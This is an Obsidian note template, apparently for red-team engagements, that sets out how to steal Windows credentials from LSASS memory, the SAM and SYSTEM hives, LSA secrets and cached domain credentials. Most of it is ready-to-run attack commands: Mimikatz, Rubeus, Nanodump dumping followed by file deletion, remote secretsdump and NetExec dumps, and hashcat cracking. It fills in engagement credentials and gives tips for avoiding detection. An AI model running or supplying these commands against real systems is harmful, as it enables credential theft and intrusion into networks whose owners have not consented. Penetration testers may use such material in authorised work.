---
# Attack-specific fields
cred_target_host:
cred_target_fqdn:
lsass_ntlm:
lsass_aes256:
sam_hashes:
lsa_secrets:
cached_creds:
notes:
---

# Credential Theft

> [!abstract] Attack Summary
> Extract credentials from Windows credential stores: **LSASS memory** (NTLM hashes, Kerberos keys, cleartext passwords), **SAM database** (local account hashes), **LSA secrets** (service account passwords, cached credentials), and **domain cached credentials** (MS-Cache v2 hashes).

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Target Host",   `\`INPUT[text(defaultValue("${p.cred_target_host || b?.target_host || ''}")):cred_target_host]\``],
  ["Target FQDN",   `\`INPUT[text(defaultValue("${p.cred_target_fqdn || b?.target_fqdn || ''}")):cred_target_fqdn]\``],
]);
```

> [!warning] All credential theft requires **local admin or SYSTEM** on the target.

---

## Method A — LSASS Memory Dump

**Windows — Mimikatz (sekurlsa)**
```dataviewjs
dv.paragraph("```bash\n# Must be SYSTEM or admin\n# Elevate first if needed\ngetsystem\n\n# Dump NTLM hashes from LSASS\nlogonpasswords\n\n# Full Mimikatz sequence via Beacon\nmimikatz sekurlsa::logonpasswords\nmimikatz sekurlsa::ekeys       # AES keys\nmimikatz sekurlsa::wdigest     # Cleartext (if WDigest enabled)\nmimikatz sekurlsa::kerberos    # Kerberos credentials\n```");
```

**Windows — Rubeus (Kerberos tickets from LSASS)**
```dataviewjs
dv.paragraph("```bash\n# List all tickets\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe triage\n\n# Dump all Kerberos tickets\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe dump /nowrap\n\n# Dump specific LUID\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe dump /luid:0xLUID /nowrap\n```");
```

**Windows — SafeDump / Nanodump (OPSEC-safe)**
```dataviewjs
dv.paragraph("```bash\n# Nanodump - stealthy LSASS dump\nexecute-assembly C:\\Tools\\Nanodump\\nanodump.exe --write C:\\Windows\\Temp\\tmp.dmp\n\n# Download and parse offline\ndownload C:\\Windows\\Temp\\tmp.dmp\n# Then: pypykatz lsa minidump tmp.dmp\n\n# Delete dump\nshell del C:\\Windows\\Temp\\tmp.dmp\n```");
```

**Linux — Parse LSASS dump**
```dataviewjs
dv.paragraph("```bash\n# Parse with pypykatz\npypykatz lsa minidump lsass.dmp\n\n# Output NTLM hashes\npypykatz lsa minidump lsass.dmp | grep -E 'NT:|Username:'\n\n# Or with Impacket secretsdump on a dump file\nimpacket-secretsdump -system SYSTEM -ntds NTDS local\n```");
```

NTLM harvested: `INPUT[text:lsass_ntlm]`
AES-256 harvested: `INPUT[text:lsass_aes256]`

---

## Method B — SAM Database

> [!info] The SAM database contains local account NTLM hashes. The SYSTEM hive is needed to decrypt it.

**Windows — Mimikatz**
```dataviewjs
dv.paragraph("```bash\nmimikatz lsadump::sam\n\n# Or\nmimikatz token::elevate lsadump::sam\n```");
```

**Windows — reg save (dump hives to disk)**
```dataviewjs
dv.paragraph("```bash\nshell reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive\nshell reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive\n\ndownload C:\\Windows\\Temp\\sam.hive\ndownload C:\\Windows\\Temp\\system.hive\n\nshell del C:\\Windows\\Temp\\sam.hive C:\\Windows\\Temp\\system.hive\n```");
```

**Linux — Parse SAM hives**
```dataviewjs
dv.paragraph("```bash\nimpacket-secretsdump -sam sam.hive -system system.hive local\n\n# Or with pypykatz\npypykatz registry --sam sam.hive --system system.hive\n```");
```

---

## Method C — LSA Secrets

> [!info] LSA secrets store service account passwords, DPAPI keys, cached domain credentials, and more.

**Windows — Mimikatz**
```dataviewjs
dv.paragraph("```bash\nmimikatz lsadump::secrets\n\n# Often reveals service account plaintext passwords!\n```");
```

**Linux — Impacket (remote)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const target   = p?.cred_target_ip || b?.target_ip || "TARGET_IP";
dv.paragraph("```bash\nimpacket-secretsdump " + domain + "/" + username + ":'" + password + "'@" + target + " -just-dc-ntlm\n\n# Or with NTLM hash\nimpacket-secretsdump " + domain + "/" + username + "@" + target + " -hashes :NTLM_HASH -just-dc\n```");
```

---

## Method D — Domain Cached Credentials (DCC2 / MS-Cache v2)

> [!info] Domain accounts that have logged in are cached locally as MS-Cache v2 hashes. These are slow to crack but valuable — especially when DC is offline.

**Windows — Mimikatz**
```dataviewjs
dv.paragraph("```bash\nmimikatz lsadump::cache\n\n# Hashes are in format $DCC2$10240#username#hash\n```");
```

**Crack DCC2 hashes (slow)**
```dataviewjs
dv.paragraph("```bash\n# Hashcat — mode 2100\nhashcat -a 0 -m 2100 '$DCC2$10240#username#hash' /usr/share/wordlists/rockyou.txt\n\n# John\njohn --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n```");
```

---

## Method E — Remote Credential Dump (No Beacon on Target)

**Linux — NetExec SAM dump**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const ntlm     = b?.ntlm_hash ?? "NTLM_HASH";
const target   = p?.cred_target_ip || b?.target_ip || "TARGET_IP";
dv.paragraph("```bash\n# SAM dump\nnxc smb " + target + " -u '" + username + "' -p '" + password + "' -d " + domain + " --sam\n\n# LSA dump\nnxc smb " + target + " -u '" + username + "' -p '" + password + "' -d " + domain + " --lsa\n\n# LSASS dump\nnxc smb " + target + " -u '" + username + "' -p '" + password + "' -d " + domain + " -M lsassy\n\n# With hash\nnxc smb " + target + " -u '" + username + "' -H '" + ntlm + "' -d " + domain + " --sam\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - LSASS memory access: **Event 10** in Sysmon (process accessed LSASS).
> - Mimikatz sekurlsa: attempts to open LSASS with `PROCESS_VM_READ` — blocked by Credential Guard.
> - Nanodump: stealthier but still touches LSASS.
> - SAM/SYSTEM hive dumps: **Event 4663** (object accessed) if auditing enabled.
> - Consider using DPAPI instead of LSASS for credential extraction when possible.
> - Credential Guard (HVCI) makes LSASS dumping much harder — plan around it.

---

## Notes & Results

`INPUT[textarea:notes]`
